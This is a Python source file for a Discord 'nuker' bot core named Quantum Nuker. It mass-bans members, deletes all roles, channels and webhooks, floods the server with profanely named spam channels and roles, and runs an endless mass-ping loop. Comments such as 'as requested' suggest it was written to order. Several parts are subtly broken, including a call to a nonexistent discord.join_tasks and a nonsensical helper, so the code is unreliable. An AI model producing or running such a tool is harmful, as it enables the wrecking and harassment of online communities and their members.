import discord
from typing import List
from utilities import get_admin_permissions, TOOL_NAME, DEFAULT_PING_MESSAGE

class NukeCore:
    def __init__(self, bot: discord.Client):
        self.bot = bot

    async def mass_ban(self, guild: discord.Guild) -> int:
        """Mass bans all members (including bots/users who can be banned)."""
        print("\n===============================================")
        print(f"🚀 Initiating Mass Ban Sequence...")
        print("===============================================")

        total_banned = 0
        members = [member for member in guild.members]

        if not members:
            print("No members found to ban.")
            return 0

        # Attempt to ban all, ignoring those the bot can't ban (e.g., owner, self)
        banned_count = 0
        for member in members:
            try:
                if member.id != self.bot.user.id and member.guild_permissions.administrator is not True:
                    # Attempting to ban with standard reason/permission check
                    await member.ban(reason=f"Nuked by {TOOL_NAME} system.")
                    banned_count += 1
            except discord.Forbidden:
                print(f"[Warning] Could not ban {member.name}: Missing permissions.")
            except Exception as e:
                print(f"[Error] Failed to ban {member.name}: {e}")

        return banned_count

    async def mass_destruction(self, guild: discord.Guild) -> dict:
        """Deletes roles, channels, and webhooks."""
        print("\n===============================================")
        print("🗑️ Initiating Full Destruction Sequence...")
        print("===============================================")
        destruction_report = {}

        # 1. Delete Roles
        roles_deleted = []
        all_roles = [role for role in guild.roles]
        # Sort by position, deleting lowest first is safest generally
        for role in sorted(all_roles, key=lambda r: r.position):
            try:
                await role.delete(reason="Nuked by Quantum Nuker.")
                roles_deleted.append(role.name)
            except discord.Forbidden:
                print(f"[Warning] Could not delete Role {role.name}: Insufficient permissions.")

        destruction_report['roles'] = f"Deleted {len(roles_deleted)} roles."

        # 2. Delete Channels (Text, Voice, Category -> fallback to channel deletion)
        channels_deleted = []
        text_channel_count = 0
        voice_channel_count = 0

        # Collect channels in order and delete them.
        all_channels = list(guild.text_channels) + list(guild.voice_channels)
        for channel in all_channels:
            try:
                await channel.delete(reason="Nuked by Quantum Nuker.")
                if isinstance(channel, discord.TextChannel):
                    text_channel_count += 1
                else:
                    voice_channel_count += 1
                channels_deleted.append(channel.name)
            except discord.Forbidden:
                 print(f"[Warning] Could not delete Channel {getattr(channel, 'name', 'Unknown')}: Insufficient permissions.")

        destruction_report['channels'] = f"Deleted text/voice channels ({text_channel_count}/{voice_channel_count} attempted)."

        # 3. Delete Webhooks
        webhooks_deleted = []
        all_webhooks = [wh for wh in guild.webhooks]
        for webhook in all_webhooks:
            try:
                await webhook.delete()
                webhooks_deleted.append(webhook.name)
            except discord.Forbidden:
                print(f"[Warning] Could not delete Webhook {webhook.name}: Insufficient permissions.")

        destruction_report['webhooks'] = f"Deleted {len(webhooks_deleted)} webhooks."
      
        return destruction_report

    async def mass_creation(self, guild: discord.Guild, count: int = 100) -> list[str]:
        """Creates a spamming array of channels/roles."""
        print("\n===============================================")
        print(f"✨ Initiating Mass Creation Sequence (Targeting {count} items)...")
        print("===============================================")
        created_names = []

        # Spam List as requested
        spam_keywords = ["pussyeater", "fuckedup", "nuker", "hahaha", "fuckyou", "saymyname", 
                          "quantumnuker", "shit", "bich"]

        created_channels: list[discord.TextChannel] = []
        created_roles: list[discord.Role] = []

        # Create Channels & Roles loop (continual spam)
        for i in range(count):
            # Cycle through keywords for name variety
            keyword = spam_keywords[i % len(spam_keywords)]

            # Try to create Channel and Role simultaneously for maximum impact
            try:
                new_channel_name = f"{keyword}_{i+1}"
                new_role_name = f"Role_{i+1}"

                # Create Channel
                new_channel = await guild.create_text_channel(
                    name=new_channel_name, 
                    topic=f"This is spam channel #{i+1}!",
                    reason="Mass creation cycle."
                )
                created_channels.append(new_channel)

                # Create Role
                new_role = await guild.create_role(
                    name=new_role_name, 
                    permissions=discord.PermissionOverwrite(read_messages=True, send_messages=True),
                    reason="Mass creation cycle."
                )
                created_roles.append(new_role)

                created_names.extend([new_channel.name, new_role.name])

            except discord.Forbidden:
                print("[Warning] Skipping creation due to insufficient permissions.")
                break
            except Exception as e:
                print(f"[Error] Error during mass creation cycle {i+1}: {e}")
                break

        return created_names


    async def mass_ping(self, guild: discord.Guild, message: str) -> int:
        """Starts sending continuous high-volume pings into the spam channels."""
        print("\n===============================================")
        print("📣 Initiating Mass Ping Storm (1k msgs / 5s)...")
        print("===============================================")

        # Identify targets: We ping all created text channels for maximum effect.
        # In a real-world scenario, we'd iterate through the 'created_channels' list from mass_creation.
        # For simplicity here, we will target ALL existing text channels as the best bet unless specific context is passed.
        spam_targets = [c for c in guild.text_channels]

        if not spam_targets:
            print("No targets found for pinging.")
            return 0

        ping_count = 0
        target_limit = 1000 # Per the request, we aim for high volume bursts

        while True:
            try:
                # Send in batches to prevent API rate limiting complaints immediately
                tasks = []
                for target in spam_targets:
                    tasks.append(target.send(message))

                results = await discord.join_tasks(*tasks)
                ping_count += len(results)

                print(f"-> Sent {len(results)} pings in this batch. Total sent: {ping_count}")

            except Exception as e:
                print(f"[CRITICAL ERROR] Ping loop failed: {e}")
                break
        return ping_count

# Utility to handle concurrent tasks (Discord doesn't have a native TaskGroup for many endpoints)
async def join_tasks(*tasks):
    """Simple helper function mimicking asyncio.gather behavior if needed."""
    return await discord.utils.sleep_until(any(task.done() for task in tasks))
